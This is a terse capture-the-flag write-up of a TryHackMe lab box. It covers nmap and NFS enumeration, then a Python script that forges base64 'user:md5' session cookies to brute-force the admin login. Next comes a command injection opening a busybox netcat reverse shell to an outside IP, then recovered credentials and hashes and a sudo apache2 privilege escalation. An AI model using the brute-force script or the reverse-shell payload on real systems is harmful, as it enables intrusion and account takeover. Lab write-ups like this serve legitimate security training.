```

PORT      STATE SERVICE  REASON  VERSION
21/tcp    open  ftp      syn-ack vsftpd 3.0.3
22/tcp    open  ssh      syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 94:ee:e5:23:de:79:6a:8d:63:f0:48:b8:62:d9:d7:ab (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDpnR3ykEuk2NQvQc0himxsomjasxw3O/GG4qFs6hsvMeL9Tz2XjphokcWL047dwd+nlJTunp4g3NIPNZ4fRM3Je/FhUcnOEN1r9lrqv8Nj5Z7W6ijggHOKF+TroSfIAY4lQqGj6mxH1v6x/KmaUYHeUzRc0CjiYambzDPWrMINP1Ystdzf0an4j6B019hNJqIZf0hqVE+85By1QB/2KkwHInr5NchKDDGjuORwK2aYia/y4OwtoXFN1bYEKo86ArmgPISJ1fiQvul9l8jp//LWQ6LP4CL0RazQpgVN0KYycjF9apiElB/wCbJmu46OJq+4MwAvNdZ0k9yKB851QCED
|   256 42:e9:55:1b:d3:f2:04:b6:43:b2:56:a3:23:46:72:c7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFLpu0hiiZtLDcv/LyQ1ueZ+JwHOws+dcFw/ec/uzWAcwO26pPCBjZ8ChHD7Wucjfb8JOVVEG/BsSaAnunj7oGM=
|   256 27:46:f6:54:44:98:43:2a:f0:59:ba:e3:b6:73:d3:90 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILDB99YDzbOHshtveNLYuxSz88jXIuijXj8gyYVZx/Nn
80/tcp    open  http     syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Home
111/tcp   open  rpcbind  syn-ack 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      45174/udp6  mountd
|   100005  1,2,3      47355/udp   mountd
|   100005  1,2,3      51523/tcp6  mountd
|   100005  1,2,3      60721/tcp   mountd
|   100021  1,3,4      34123/tcp   nlockmgr
|   100021  1,3,4      38547/tcp6  nlockmgr
|   100021  1,3,4      41101/udp   nlockmgr
|   100021  1,3,4      54594/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  syn-ack 2-3 (RPC #100227)
33268/tcp open  mountd   syn-ack 1-3 (RPC #100005)
34123/tcp open  nlockmgr syn-ack 1-4 (RPC #100021)
60721/tcp open  mountd   syn-ack 1-3 (RPC #100005)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

On checking the workflow of the site, I think that I need to get the admin's creds using some misconfigs as there is a /config.php file but returns nothing
Maybe changing the session will do anything?
Nothing different, ID was YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM

Recon on nfs
```
namura@pop-os ~/tryhackme $ showmount -e 10.10.114.250
Export list for 10.10.114.250:
/mnt/share *
namura@pop-os ~/tryhackme $ rpcinfo -p 10.10.114.250
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
    100005    1   udp  53833  mountd
    100005    1   tcp  53233  mountd
    100005    2   udp  56473  mountd
    100005    2   tcp  42045  mountd
    100005    3   udp  48131  mountd
    100005    3   tcp  44434  mountd
    100003    2   tcp   2049  nfs
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    2   tcp   2049
    100227    3   tcp   2049
    100003    2   udp   2049  nfs
    100003    3   udp   2049  nfs
    100003    4   udp   2049  nfs
    100227    2   udp   2049
    100227    3   udp   2049
    100021    1   udp  36713  nlockmgr
    100021    3   udp  36713  nlockmgr
    100021    4   udp  36713  nlockmgr
    100021    1   tcp  33037  nlockmgr
    100021    3   tcp  33037  nlockmgr
    100021    4   tcp  33037  nlockmgr

```

So, I got in usinf the NFS service and then there was a file that contained the ftp username and passwd, but there was some probelm with UID and GUID, which was resolved by creating a new user locally and assigning it to a new ID
Then I got in using ftp and there were multiple files, got all of them and there was a user `rick` 

```
namura@pop-os ~/tryhackme $ cat .from_admin.txt
To all employees, this is "admin" speaking,
i came up with a safe list of passwords that you all can use on the site, these passwords don't appear on any wordlist i tested so far, so i encourage you to use them, even me i'm using one of those.

NOTE To rick : good job on limiting login attempts, it works like a charm, this will prevent any future brute forcing.
```

There was also a password list, Since there was a limiting firewall, so Chatgpt made a script and I got in as admin:uDh3jCQsdcuLhjVkAy5x
The script is as follows
```
#!/usr/bin/env python3
import hashlib
import base64
import requests
from pathlib import Path
import sys

FILE_NAME = ".passwords_list.txt"
USERNAME = "admin"
BASE_IP = "10.201.109.156"
BASE_URL = f"http://{BASE_IP}/administration.php"
TIMEOUT = 6  # seconds

def create_session_id(username: str, password: str) -> str:
    """Return base64 string of 'username:md5hex(password)'."""
    md5_hex = hashlib.md5(password.encode()).hexdigest()
    token = f"{username}:{md5_hex}"
    return base64.b64encode(token.encode("ascii")).decode("ascii")

def try_password(url: str, session_id: str) -> str:
    """Send GET with PHPSESSID cookie and return response text (or '' on error)."""
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Accept": "text/html",
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1",
        "Cookie": f"PHPSESSID={session_id}",
    }
    try:
        r = requests.get(url, headers=headers, timeout=TIMEOUT)
        return r.text
    except requests.RequestException as e:
        print(f"[!] Request error: {e}", file=sys.stderr)
        return ""

def main():
    path = Path(FILE_NAME)
    if not path.is_file():
        print(f"[!] Password file not found: {FILE_NAME}")
        return

    success_marker = "Access denied"
    for line in path.read_text().splitlines():
        password = line.strip()
        if not password:
            continue
        sid = create_session_id(USERNAME, password)
        body = try_password(BASE_URL, sid)
        if not body:
            continue
        if success_marker not in body:
            print(f"[+] Success: {USERNAME}:{password}")
            # optionally break if you only want the first hit:
            # break

if __name__ == "__main__":
    main()

```

Got in using this busyboc netcat, for some reason pure bash tcp didn't work
`apache2 && busybox nc 10.17.19.181 4444 -e sh`

Found db creds on the config.php file, `rick:N3v3rG0nn4G1v3Y0uUp`
found the creds of admin on the db, `admin:d6573ed739ae7fdfb3ced197d94820a5`

Nothing interesting on the SUID binaries
On sudo listing, got ` (root) /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2`

There was only one liner on gtfobins using apache2ctl which obviously didn't work
https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/
https://blog.devgenius.io/hijack-tryhackme-write-up-3bc64e873f00
Needed another script to exploit the path
Got in as root and got the flag~
